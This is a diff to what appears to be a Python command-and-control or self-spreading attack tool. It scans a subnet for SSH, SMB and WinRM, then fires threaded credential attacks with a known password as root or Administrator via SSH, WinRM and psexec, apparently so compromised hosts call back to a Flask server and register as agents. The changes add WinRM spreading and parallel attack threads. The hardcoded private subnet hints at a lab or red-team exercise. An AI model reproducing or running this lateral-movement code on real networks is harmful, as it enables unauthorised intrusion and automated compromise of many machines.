@@ -104,6 +104,8 @@ def handle_client(client_socket, client_address):
             if output:
                 split_output = output.split("\n")
                 hostname = split_output[0].strip()
+                if "not found" in hostname:
+                    hostname = "?"
                 whoami = split_output[1].strip()
             else:
                 raise ValueError("No output received")
@@ -191,6 +193,7 @@ def network_scan(subnet="192.168.108.", ports=[22, 445]):
     """
     ssh_hosts = []
     smb_hosts = []
+    winrm_hosts = []
     def scan_host(ip):
         for port in ports:
             try:
@@ -204,6 +207,9 @@ def network_scan(subnet="192.168.108.", ports=[22, 445]):
                         elif port == 445:
                             smb_hosts.append(ip)
                             atk_logger.info(f"[INFO] SMB (port 445) open on {ip}")
+                        elif port == 5985:
+                            winrm_hosts.append(ip)
+                            atk_logger.info(f"[INFO] WINRM (port 5985) open on {ip}")
                     else:
                         # print(f"[DEBUG] Port {port} closed on {ip}.")
                         pass
@@ -216,21 +222,30 @@ def network_scan(subnet="192.168.108.", ports=[22, 445]):
         executor.map(scan_host, ips)
     atk_logger.info("[INFO] Scan completed.")
 
-    return ssh_hosts, smb_hosts
+    return ssh_hosts, smb_hosts, winrm_hosts
 
 def perform_attack():
-    ssh_hosts, smb_hosts = network_scan(TARGET_SUBNET)
+    ssh_hosts, smb_hosts, winrm_hosts = network_scan(TARGET_SUBNET)
     for host in ssh_hosts:
         if host in registered_agents_ip:
             continue
         atk_logger.info(f"Attempting ssh attack for {host}")
-        attacks.ssh("root", KNOWN_PW, host, FLASK_HOST, FLASK_PORT)
-        attacks.ssh("Administrator", KNOWN_PW, host, FLASK_HOST, FLASK_PORT)
+        thread = threading.Thread(target=attacks.ssh, args=("root", KNOWN_PW, host, FLASK_HOST, FLASK_PORT))
+        thread.start()
+        thread = threading.Thread(target=attacks.ssh, args=("Administrator", KNOWN_PW, host, FLASK_HOST, FLASK_PORT))
+        thread.start()
+    for host in winrm_hosts:
+        if host in registered_agents_ip:
+            continue
+        atk_logger.info(f"Attempting winrm attack for {host}")
+        thread = threading.Thread(target=attacks.winrm, args=("Administrator", KNOWN_PW, host, FLASK_HOST, FLASK_PORT))
+        thread.start()
     for host in smb_hosts:
         if host in registered_agents_ip:
             continue
         atk_logger.info(f"Attempting smb attack for {host}")
-        attacks.psexec("Administrator", KNOWN_PW, host, FLASK_HOST, FLASK_PORT)
+        thread = threading.Thread(target=attacks.psexec, args=("Administrator", KNOWN_PW, host, FLASK_HOST, FLASK_PORT))
+        thread.start()
     
 
 @app.route('/')
